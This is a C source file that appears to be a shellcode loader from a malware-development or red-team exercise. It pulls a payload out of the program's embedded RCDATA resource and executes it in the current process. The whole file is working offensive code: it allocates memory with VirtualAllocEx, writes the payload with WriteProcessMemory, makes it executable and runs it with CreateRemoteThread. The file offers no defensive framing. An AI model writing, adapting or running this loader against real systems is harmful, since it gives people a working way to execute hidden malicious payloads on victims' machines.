#include "common.h"
#include "resource.h"

BOOL FetchResourceWin32() {
    HRSRC hResource = NULL;
    HGLOBAL hGlobal = NULL;
    PVOID pPayloadAddress = NULL;
    SIZE_T sPayloadSize = 0;

    // Find and load the resource
    hResource = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
    if (hResource == NULL) {
        PRINT_ERROR("FindResourceW", GetLastError());
        return FALSE;
    }

    hGlobal = LoadResource(NULL, hResource);
    if (hGlobal == NULL) {
        PRINT_ERROR("LoadResource", GetLastError());
        return FALSE;
    }

    pPayloadAddress = LockResource(hGlobal);
    if (pPayloadAddress == NULL) {
        PRINT_ERROR("LockResource", GetLastError());
        return FALSE;
    }

    sPayloadSize = SizeofResource(NULL, hResource);
    if (sPayloadSize == 0) {
        PRINT_ERROR("SizeofResource", GetLastError());
        return FALSE;
    }

    OKAY("Payload Address: 0x%p", pPayloadAddress);
    OKAY("Payload Size: %zu bytes", sPayloadSize);
    OKAY("Press Enter to continue with Win32 injection...");
    getchar();

    // Use pseudo-handle for current process
    return Win32Injection((DWORD)(LONG_PTR)-1, (PBYTE)pPayloadAddress, sPayloadSize);
}

BOOL Win32Injection(
	_In_ CONST DWORD ProcessId,
	_In_ PBYTE Payload,
	_In_ CONST SIZE_T PayloadSize
) {
    BOOL   State = TRUE;
    DWORD  TID = 0;
    DWORD  OldProtection = 0;
    HANDLE ProcessHandle = NULL;
    HANDLE ThreadHandle = NULL;
    PVOID  Buffer = NULL;

	ProcessHandle = GetCurrentProcess();{
    if (ProcessHandle == NULL) {
        PRINT_ERROR("GetCurrentProcess", GetLastError());
        return FALSE;
	}
	}
	OKAY("Using current process handle: 0x%p", ProcessHandle);

    // Allocate memory in the target process
    Buffer = VirtualAllocEx(ProcessHandle, NULL, PayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (Buffer == NULL) {
        PRINT_ERROR("VirtualAllocEx", GetLastError());
        return FALSE;
    }
    OKAY("Allocated memory in target process: 0x%p", Buffer);
    // Write the payload to the allocated memory
    if (!WriteProcessMemory(ProcessHandle, Buffer, Payload, PayloadSize, NULL)) {
        PRINT_ERROR("WriteProcessMemory", GetLastError());
        VirtualFreeEx(ProcessHandle, Buffer, 0, MEM_RELEASE);
        return FALSE;
    }
    OKAY("Wrote payload to memory: 0x%p", Buffer);
    
    if(!VirtualProtectEx(ProcessHandle, Buffer, PayloadSize, PAGE_EXECUTE_READ, &OldProtection)) {
        PRINT_ERROR("VirtualProtectEx", GetLastError());
        VirtualFreeEx(ProcessHandle, Buffer, 0, MEM_RELEASE);
        return FALSE;
	}
    OKAY("Changed memory protection to PAGE_EXECUTE_READ for: 0x%p", Buffer);
    // Create a thread in the target process to execute the payload
    ThreadHandle = CreateRemoteThread(ProcessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)Buffer, NULL, 0, &TID);
    if (ThreadHandle == NULL) {
        PRINT_ERROR("CreateRemoteThread", GetLastError());
        VirtualFreeEx(ProcessHandle, Buffer, 0, MEM_RELEASE);
        return FALSE;
    }
    OKAY("Created remote thread with TID: %lu", TID);
	INFO("Waiting for remote thread execution to complete...");
    // Wait for the thread to finish execution
    WaitForSingleObject(ThreadHandle, INFINITE);
    OKAY("Remote thread execution completed");
	return State;
}